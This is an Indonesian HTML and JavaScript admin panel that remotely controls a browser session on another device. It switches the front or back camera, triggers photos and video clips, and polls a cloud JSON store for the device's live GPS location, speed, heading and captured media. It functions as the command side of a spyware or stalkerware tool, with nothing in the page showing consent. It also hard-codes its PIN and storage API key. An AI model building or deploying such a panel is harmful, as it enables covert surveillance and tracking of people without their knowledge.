<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Kamera Depan/Belakang & Lokasi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
        .container { max-width: 980px; margin: 0 auto; }

        #loginScreen {
            max-width: 360px;
            margin: 100px auto;
            background: #1e293b;
            padding: 28px;
            border-radius: 14px;
            border: 1px solid #334155;
            text-align: center;
        }
        #loginScreen h2 { margin-bottom: 16px; font-size: 20px; }
        #loginScreen input {
            width: 100%; padding: 12px; margin-bottom: 14px;
            border-radius: 8px; border: 1px solid #475569;
            background: #0f172a; color: #fff; text-align: center; font-size: 16px;
        }

        #dashboard { display: none; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 12px; margin-bottom: 18px;
            padding-bottom: 16px; border-bottom: 1px solid #334155;
        }
        .header h1 { font-size: 22px; }
        .live-pill {
            display: inline-flex; align-items: center; gap: 6px;
            font-size: 12px; color: #4ade80;
            background: rgba(34, 197, 94, 0.14); border: 1px solid rgba(34, 197, 94, 0.35);
            padding: 4px 10px; border-radius: 999px; margin-top: 6px;
        }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80; }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        button {
            padding: 10px 15px; border: none; border-radius: 8px;
            font-weight: 600; cursor: pointer; font-size: 13px;
        }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-primary:hover { background: #2563eb; }
        .btn-cam { background: #6366f1; color: white; }
        .btn-cam:hover { background: #4f46e5; }
        .btn-photo { background: #10b981; color: white; }
        .btn-photo:hover { background: #059669; }
        .btn-rec { background: #ef4444; color: white; }
        .btn-rec:hover { background: #dc2626; }
        .btn-danger { background: #7f1d1d; color: #fecaca; }
        .btn-danger:hover { background: #991b1b; }

        .section-title { font-size: 16px; margin-bottom: 12px; color: #e2e8f0; }

        .status-card {
            background: #1e293b; border: 1px solid #334155;
            border-radius: 12px; padding: 16px; margin-bottom: 22px;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 14px;
        }
        .status-card h3 { font-size: 15px; color: #fff; margin-bottom: 5px; }
        .status-card p { font-size: 12px; color: #94a3b8; margin-bottom: 3px; }
        .badge-online {
            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
            background: rgba(34, 197, 94, 0.2); color: #4ade80; margin-left: 6px;
        }
        .badge-closed {
            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
            background: rgba(148, 163, 184, 0.2); color: #cbd5e1; margin-left: 6px;
        }

        .cmd-panel {
            background: #1e293b; border: 1px solid #334155;
            border-radius: 12px; padding: 16px; margin-bottom: 24px;
        }
        .cmd-panel h2 { font-size: 15px; margin-bottom: 10px; }
        .cmd-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .cmd-status { font-size: 12px; color: #94a3b8; margin-top: 10px; }

        .log-grid { display: grid; gap: 16px; }
        .log-card {
            background: #1e293b; border: 1px solid #334155;
            border-radius: 12px; padding: 18px;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 16px;
        }
        .log-left { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; flex: 1; }
        .media-box {
            width: 170px; height: 128px; border-radius: 8px;
            border: 1px solid #475569; background: #0f172a;
            overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        .media-box img, .media-box video { width: 100%; height: 100%; object-fit: cover; }
        .log-info h3 { font-size: 16px; color: #fff; margin-bottom: 6px; }
        .log-info p { font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
        .badge {
            display: inline-block; background: rgba(59, 130, 246, 0.15);
            color: #60a5fa; padding: 3px 8px; border-radius: 6px; font-size: 11px; margin-left: 4px;
        }
        .badge-rec { background: rgba(239, 68, 68, 0.18); color: #f87171; }
        .device-info { font-size: 11px !important; color: #64748b !important; max-width: 440px; word-break: break-all; }
        .card-actions { display: flex; flex-direction: column; gap: 8px; min-width: 165px; }
        .btn-map, .btn-dl {
            color: #fff; text-decoration: none; text-align: center;
            padding: 9px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
            display: inline-block;
        }
        .btn-map { background: #0ea5e9; }
        .btn-map:hover { background: #0284c7; }
        .btn-dl { background: #475569; }
        .btn-dl:hover { background: #334155; }
        .empty-state { text-align: center; padding: 28px; color: #64748b; background: #1e293b; border-radius: 12px; border: 1px solid #334155; }
    </style>
</head>
<body>

<div class="container">
    <div id="loginScreen">
        <h2>🔒 Login Admin</h2>
        <input type="password" id="pinInput" placeholder="Masukkan PIN Admin" onkeypress="if(event.key==='Enter') checkPin()">
        <button class="btn-primary" style="width:100%" onclick="checkPin()">Masuk</button>
    </div>

    <div id="dashboard">
        <div class="header">
            <div>
                <h1>📍📷 Kontrol Kamera Depan/Belakang & Log</h1>
                <div class="live-pill"><span class="dot"></span> Auto-Sync (tiap 3d) • Total Log: <span id="totalCount">0</span></div>
            </div>
            <div class="actions">
                <button class="btn-primary" onclick="syncAll(true)">🔄 Sinkron Sekarang</button>
                <button class="btn-danger" onclick="clearLogs()">🗑️ Hapus Log</button>
            </div>
        </div>

        <h2 class="section-title">🛰️ Status Sesi & Pergerakan Lokasi</h2>
        <div id="sessionContainer" class="live-grid">
            <div class="empty-state">Menunggu sesi aktif...</div>
        </div>

        <div class="cmd-panel">
            <h2>Kontrol Kamera & Pengambilan dari Admin</h2>
            <div class="cmd-row">
                <button class="btn-cam" onclick="sendCommand('SWITCH_CAM', 'user')">🤳 Kamera Depan</button>
                <button class="btn-cam" onclick="sendCommand('SWITCH_CAM', 'environment')">📷 Kamera Belakang</button>
                <button class="btn-photo" onclick="sendCommand('PHOTO', null)">📸 Ambil Foto</button>
                <button class="btn-rec" onclick="sendCommand('RECORD', null)">🎥 Rekam Klip (3,5d)</button>
            </div>
            <div id="cmdStatus" class="cmd-status">Status perintah: Siap mengirim perintah.</div>
        </div>

        <h2 class="section-title">📂 Hasil Foto & Rekaman Tersimpan</h2>
        <div id="logContainer" class="log-grid">
            <div class="empty-state">Memuat data...</div>
        </div>
    </div>
</div>

<script>
    const ADMIN_PIN = "123456";
    const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
    const API_KEY   = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
    const AUTO_SYNC_MS = 3000;

    let syncTimer = null;
    let isFetching = false;
    let lastRenderedLogCount = -1;

    function checkPin() {
        const input = document.getElementById('pinInput').value;
        if (input === ADMIN_PIN) {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            startAutoSync();
        } else {
            alert("PIN salah!");
        }
    }

    function startAutoSync() {
        if (syncTimer) clearInterval(syncTimer);
        syncAll(true);
        syncTimer = setInterval(() => syncAll(false), AUTO_SYNC_MS);
    }

    async function sendCommand(actionType, facingVal) {
        const cmdStatus = document.getElementById('cmdStatus');
        cmdStatus.textContent = "Mengirim perintah...";

        try {
            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
            let currentData = { logs: [], liveSessions: {} };
            if (getRes.ok) {
                const parsed = await getRes.json();
                currentData = {
                    logs: Array.isArray(parsed.logs) ? parsed.logs : [],
                    liveSessions: parsed.liveSessions && typeof parsed.liveSessions === "object" ? parsed.liveSessions : {},
                    command: parsed.command || {}
                };
            }

            currentData.command = {
                action: actionType,
                facing: facingVal,
                targetSessionId: null,
                token: "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6)
            };

            const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
            const putRes = await fetch(putUrl, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(currentData)
            });

            if (!putRes.ok) throw new Error("Gagal mengirim perintah");

            const labelFacing = facingVal === "environment" ? "Kamera Belakang" : (facingVal === "user" ? "Kamera Depan" : actionType);
            cmdStatus.textContent = `Perintah (${labelFacing}) terkirim. Tunggu ~3–5 detik hingga diproses perangkat.`;
        } catch (err) {
            cmdStatus.textContent = "Gagal mengirim perintah.";
            console.error(err);
        }
    }

    function renderSessions(liveSessions) {
        const container = document.getElementById('sessionContainer');
        const list = Object.values(liveSessions || {})
            .filter(item => item && item.lat !== null && item.lng !== null)
            .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));

        if (list.length === 0) {
            container.innerHTML = '<div class="empty-state">Belum ada sesi perangkat.</div>';
            return;
        }

        const latest = list[0];
        const ageSec = latest.updatedAt ? Math.max(0, Math.round((Date.now() - latest.updatedAt) / 1000)) : null;
        const isOpen = ageSec !== null && ageSec <= 10;
        const camPos = escapeHtml(latest.kameraPosisi || "Depan");

        const statusBadge = isOpen
            ? `<span class="badge-online">Chrome Terbuka • Kamera ${latest.kameraAktif ? camPos : "Nonaktif"}</span>`
            : `<span class="badge-closed">Chrome Ditutup / Tidak Aktif (${ageSec ?? "-"}d lalu)</span>`;

        container.innerHTML = `
            <div class="status-card" style="margin-bottom:22px;">
                <div>
                    <h3>${escapeHtml(latest.nama || "HP Saya")} ${statusBadge}</h3>
                    <p>🌐 <strong>Koordinat:</strong> ${latest.lat}, ${latest.lng} • <strong>Akurasi:</strong> ${escapeHtml(latest.akurasi || "-")}</p>
                    <p>🧭 <strong>Kecepatan:</strong> ${escapeHtml(latest.kecepatan || "-")} • <strong>Arah:</strong> ${escapeHtml(latest.arah || "-")} • <strong>Update:</strong> ${escapeHtml(latest.waktu || "-")}</p>
                </div>
                <div>
                    <a class="btn-map" href="https://www.google.com/maps?q=${latest.lat},${latest.lng}" target="_blank">Buka di Google Maps ↗</a>
                </div>
            </div>
        `;
    }

    function renderLogs(logs, forceRender) {
        const container = document.getElementById('logContainer');
        document.getElementById('totalCount').textContent = logs.length;

        if (!forceRender && logs.length === lastRenderedLogCount) return;
        lastRenderedLogCount = logs.length;

        if (!logs || logs.length === 0) {
            container.innerHTML = '<div class="empty-state">Belum ada foto atau rekaman tersimpan.</div>';
            return;
        }

        container.innerHTML = logs.map((item, idx) => {
            const hasPhoto = typeof item.foto === "string" && item.foto.startsWith("data:image/");
            const hasVideo = typeof item.video === "string" && item.video.startsWith("data:video/");
            const hasCoords = item.lat !== null && item.lat !== undefined && item.lng !== null && item.lng !== undefined;

            let mediaHtml = `<span style="font-size:11px;color:#64748b;">Tidak ada media</span>`;
            let downloadHtml = "";

            if (hasVideo) {
                mediaHtml = `<video src="${item.video}" controls playsinline></video>`;
                const ext = item.video.includes("mp4") ? "mp4" : "webm";
                downloadHtml = `<a class="btn-dl" href="${item.video}" download="rekaman_${item.id || idx}.${ext}">⬇ Unduh Rekaman</a>`;
            } else if (hasPhoto) {
                mediaHtml = `<img src="${item.foto}" alt="Foto">`;
                downloadHtml = `<a class="btn-dl" href="${item.foto}" download="foto_${item.id || idx}.jpg">⬇ Unduh Foto</a>`;
            }

            const mapHtml = hasCoords
                ? `<a class="btn-map" href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank">Buka di Google Maps ↗</a>`
                : `<span class="badge">Tanpa Koordinat</span>`;

            const typeBadge = hasVideo
                ? `<span class="badge badge-rec">REKAMAN KLIP</span>`
                : `<span class="badge">FOTO</span>`;

            const camBadge = `<span class="badge">Kamera ${escapeHtml(item.kameraPosisi || "Depan")}</span>`;

            return `
                <div class="log-card">
                    <div class="log-left">
                        <div class="media-box">${mediaHtml}</div>
                        <div class="log-info">
                            <h3>${escapeHtml(item.nama)} ${typeBadge} ${camBadge} <span class="badge">GPS: ${escapeHtml(item.akurasi || "-")}</span></h3>
                            <p>🕒 <strong>Waktu:</strong> ${escapeHtml(item.waktu || "-")}</p>
                            <p>🌐 <strong>Koordinat:</strong> ${hasCoords ? `${item.lat}, ${item.lng}` : "Tidak tersedia"}</p>
                            <p class="device-info">📱 ${escapeHtml(item.perangkat || "")}</p>
                        </div>
                    </div>
                    <div class="card-actions">
                        ${mapHtml}
                        ${downloadHtml}
                    </div>
                </div>
            `;
        }).join('');
    }

    async function syncAll(forceRender) {
        if (isFetching) return;
        isFetching = true;

        try {
            const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
            if (!res.ok) throw new Error("Gagal mengambil data");

            const data = await res.json();
            renderSessions(data.liveSessions || {});
            renderLogs(Array.isArray(data.logs) ? data.logs : [], forceRender);
        } catch (err) {
            if (forceRender) {
                document.getElementById('sessionContainer').innerHTML = '<div class="empty-state" style="color:#f87171;">Gagal menyinkronkan data.</div>';
            }
            console.error(err);
        } finally {
            isFetching = false;
        }
    }

    async function clearLogs() {
        if (!confirm("Yakin ingin menghapus seluruh riwayat foto & rekaman?")) return;
        try {
            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
            let currentCmd = { action: "NONE", targetSessionId: null, facing: null, token: null };
            let currentLive = {};
            if (getRes.ok) {
                const parsed = await getRes.json();
                if (parsed && parsed.command) currentCmd = parsed.command;
                if (parsed && parsed.liveSessions) currentLive = parsed.liveSessions;
            }

            const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
            const res = await fetch(putUrl, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ logs: [], liveSessions: currentLive, command: currentCmd })
            });
            if (res.ok) {
                syncAll(true);
            } else {
                alert("Gagal menghapus log.");
            }
        } catch (err) {
            alert("Terjadi kesalahan koneksi.");
        }
    }

    function escapeHtml(text) {
        if (!text) return "";
        return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    }
</script>

</body>
</html>
